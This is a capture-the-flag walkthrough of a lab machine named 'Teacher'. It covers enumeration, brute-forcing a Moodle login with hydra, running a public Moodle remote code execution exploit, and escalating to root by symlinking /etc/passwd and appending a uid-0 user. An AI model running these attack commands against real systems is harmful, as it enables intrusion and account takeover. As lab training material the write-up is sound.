---
title: Teacher
tags: linux
---

![image](assets/79379168-723b5100-7f2c-11ea-8a8b-97b160e7a5c8.png)

## Overview

Teacher is a debian box running moodle which is vulnerable to remote code execution.  A hint for giovanni's password is hidden in a png file on the website. Hydra was used to crack the passwod and gain the credentials required to run the exploit which provides shell as www-data. Enumerating the filesystem uncovers a password for mariadb which contains a hashed MD5 password which is easily findable from an internet search. I was able to switch users to giovanni and take advantage of a backup script run by script that runs the chmod 777 command. A symbolic link is created to /etc/password giving me full permissions and allowing me to add a user with root permissions to the system.

## Enumeration

**Software**

* Debian 9.5 Stretch
* Apache 2.4.25
* mysql  Ver 15.1 Distrib 10.1.26-MariaDBsudo
* moodle 3.4

**Port Scan**

```
nmap -sT -A -p- 10.10.10.153 -oN ~/boxes/teacher/_full_tcp_nmap.txt
```
* 80/tcp - http

**Directory/File Brute Force**

```
gobuster dir -u http://10.10.10.153 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html -t 40
```

* /gallery.html - stock pictures
* /index.html - main school website
* /images - large list of png files
* /css - contains style.css
* /manual - Apache HTTP Server Version 2.4 documentation
* /js - 3 javascript files
* /javascript - forbidden
* /fonts - font files
* /phpmyadmin - forbidden
* /moodle - redirected to school course information page


```
gobuster dir -u http://10.10.10.153/moodle -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html -t 40
```
* /media
* /files
* /user
* /calendar
* /version.php
* /admin
* /comment
* /report
* /local
* /pix
* /tag
* /rss
* /search
* /login
* /group
* /my
* /blog
* /index.php
* /install
* /install.php
* /lib
* /portfolio
* /cache
* /notes
* /message
* /lang
* /theme
* /blocks
* /question
* /config.php
* /backup
* /rating
* /filter
* /mod
* /auth
* /course
* /error
* /badges
* /repository
* /analytics
* /availability
* /webservice
* /plagiarism
* /competency


## Steps (user)

Browsing to http://10.10.10.153 brought me to a school webpage.  

![image](assets/85213675-6a829900-b32f-11ea-84df-26eafb10b830.png)

As I was looking over the site, trying different functionality and viewing the source code I found this in gallery.html's source.

![image](assets/85213955-35784580-b333-11ea-8f4a-e9ba39391d4e.png)

I downloaded 5.png and ran exiftool on it which showed that it was a text file. Printing the file to screen showed a message and partial password for user Govanni

![image](assets/85213979-85570c80-b333-11ea-99a7-09a8a28f77da.png)

```
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
```

I wasn't able to find any additional information so I moved on. Looking back at the gobuster results, I browsed to http://10.10.10.158/moodle

![image](assets/85213723-23e16e80-b330-11ea-83ad-f23861b5289c.png)

I clicked on various links and pages and didn't find anything useful. I did an internet search and found that I could get the version number by browsing to http://10.10.10.153/moodle/lib/upgrade.txt - 3.4

![image](assets/85213863-0a412680-b332-11ea-9c85-1fe66b5b7b47.png)

A search for moodle 3.4 in searchsploit showed one result. Reviewing this exploit I learned that a user with the teacher role could execute arbitrary code. https://blog.ripstech.com/2018/moodle-remote-code-execution/

![image](assets/85213873-2d6bd600-b332-11ea-91b0-7cd4d3e4fb36.png)

I went to the login page and tried some basic username/password combos (admin/password, admin/teacher, etc) but none of them worrked but I did have a partial password for giovanni. I decided to use hydra to brute force his account. Since I only needed to guess the last character I used crunch to generate a password list, using ascii-32-95 which includes all 95 characters on standard US keyboard and output to passwords.txt

```
crunch 15 15 -f /usr/share/rainbowcrack/charset.txt ascii-32-95 -t Th4C00lTheacha@ > passwords.txt
```

![image](assets/85214071-80468d00-b334-11ea-89f3-deda014f28e6.png)

Next I enabled burp proxy so I could capture the post request needed to set up the hydra command.

![image](assets/85214139-5d68a880-b335-11ea-9542-c9fba0617a57.png)

![image](assets/85214167-c5b78a00-b335-11ea-80b8-1b833bb7af9e.png)

The command was built as follows:

```
hydra -l giovanni -P passwords.txt 10.10.10.153 http-post-form "/moodle/login/index.php:anchor=&username=^USER^&password=^PASS^:Invalid Login"
```

The command succeeds and shows password as **Th4C00lTheacha#**

![image](assets/85214237-6a39cc00-b336-11ea-9a8d-4a7dbeccd8a0.png)

Heading back over to http://10.10.10.153/moodle/login/index.php I was able to log in as giovanni

![image](assets/85214267-9d7c5b00-b336-11ea-9c4a-81b7d24b369f.png)

Now that I had credentials I could use the moodle exploit. Reading the exploit the syntax is

![image](assets/85214298-f0561280-b336-11ea-8449-ec8bbb604fbd.png)

```
php 46551.php url=http://10.10.10.153/moodle user=giovanni pass=Th4C00lTheacha# ip=10.10.10.153 port=80 course=2
```

> Note: Trying course=1 showed an error from the script asking if the script belonged to the teacher so I changed it to 2.

Received shell as www-data

![image](assets/85214492-7d9a6680-b339-11ea-9c40-0b9cbda6061f.png)

I upgraded to a fully functioning shell by running the following commands.
```
python -c 'import pty;pty.spawn('/bin/bash')'
CTRL+Z
stty raw -echo
fg <enter><enter>
export SHELL=/bin/bash
export TERM=xterm-color
```

mariadb password

![image](assets/85214516-fd283580-b339-11ea-9e50-bba7556ae689.png)

```
$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';

```
I logged into mysql via the cli using the password found in config.php **Welkom1!**

```
mysql -u root -p
```
![image](assets/85214722-0666d180-b33d-11ea-8a22-d00519a3c212.png)

I ran a command to show databases (show databses;), selected moodle (use moodle;), showed tables (show tables;), and output all records for mdl_users (select * from mdl_user;). I found what looked like an MD5 hash

![image](assets/85214739-53e33e80-b33d-11ea-9dcb-ff3b158e881b.png)

I did an internet search for the hash and found that a site had it already reversed. **expelled**

![image](assets/85214752-842add00-b33d-11ea-86f9-9c17eb882d03.png)

I used the command su log in as giovanni

![image](assets/85214841-6ad66080-b33e-11ea-8b25-e0e74b7bb705.png)

```
while true; do pid=$(pgrep 'backup.sh' | head -1); if [[ -n "$pid" ]]; then strace  -s 2000 -vvtf -p "$pid"; break; fi; done
```
```
<?php echo exec('id > /tmp/b.txt'); ?>
```

## Steps (root/system)

Reviewing giovanni's home directory I found a folder called work which contained a file called backup_courses.tar.gz.

![image](assets/85214866-d02a5180-b33e-11ea-9880-6726760f7fea.png)

To see if any cron jobs were running I decided to us pspy so I copied it to my working directory and started a python http server

```
cp ~/tools/pspy/pspy32 .
sudo python3 -m http.server 80
```

Wget was used to copy pspy32 to the target and run it

```
wget http://10.10.14.21/pspy32
chmod +x pspy32 && ./pspy32
```

I saw that a file called backup.sh was being run

![image](assets/85214851-98230e80-b33e-11ea-88ed-a84eba8ede4e.png)

Taking a look at backup.sh
```
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

This script does the following:
* changes to /home/giovanni/work
* creates a tar file of courses and all subfolders and stores a file called backup_courses.tar.gz in tmp
* changes to tmp folder
* extracts backup_courses.tar.gz
* changes permissions to chmod 777 recursively

I took advantage of the chmod 777 command by setting a symbolic link to /etc/passwd from a file in /home/giovanni/work/tmp/ called passwd. Once the script was run I was able to add a user and gain root privileges.

First I generated a password which was then appended to /etc/passwd
```
openssl passwd -1 -salt gonzo password
echo 'gonzo:$1$gonzo$1t.J8KuM9rxYwo.5voEfD/:0:0:/root/root:/bin/bash' >> /etc/passwd
```

I was then able to su to gonzo which gave me access as root.

```
su gonzo
```

![image](assets/85215988-84cb6f80-b34d-11ea-864b-2d170d812996.png)
